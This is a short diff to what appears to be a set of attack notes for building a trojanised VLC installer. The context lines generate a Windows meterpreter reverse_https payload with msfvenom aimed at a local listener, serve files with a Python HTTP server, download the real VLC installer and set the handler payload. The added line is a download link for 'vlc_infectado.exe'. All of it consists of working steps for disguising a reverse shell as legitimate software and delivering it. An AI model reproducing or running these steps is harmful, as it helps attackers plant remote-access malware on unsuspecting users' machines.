@@ -10,6 +10,9 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
+http://192.168.1.137:8080/vlc_infectado.exe
+
+
 wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup.exe
 
 set PAYLOAD windows/x64/meterpreter/reverse_https
